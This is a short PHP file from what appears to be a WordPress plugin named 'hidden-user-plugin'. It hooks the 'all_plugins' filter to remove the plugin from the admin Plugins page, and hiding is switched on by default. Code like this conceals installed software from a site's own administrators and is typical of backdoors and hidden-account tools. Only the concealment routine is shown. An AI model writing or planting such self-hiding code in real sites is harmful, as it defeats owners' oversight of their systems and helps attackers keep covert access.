<?php

// Hook into the plugin list filter to remove this plugin from the admin Plugins page
add_filter('all_plugins', 'hu_hide_this_plugin');

function hu_hide_this_plugin($plugins) {
    // Path to this plugin's main file
    $plugin_path = plugin_basename(dirname(__DIR__) . '/hidden-user-plugin.php');

    // Get saved option
    $hide_plugin = get_option('hu_hide_plugin', 'yes');
    
     // Remove this plugin from the list
    if ($hide_plugin === 'yes' && isset($plugins[$plugin_path])) {
        unset($plugins[$plugin_path]);
    }

    return $plugins;
}
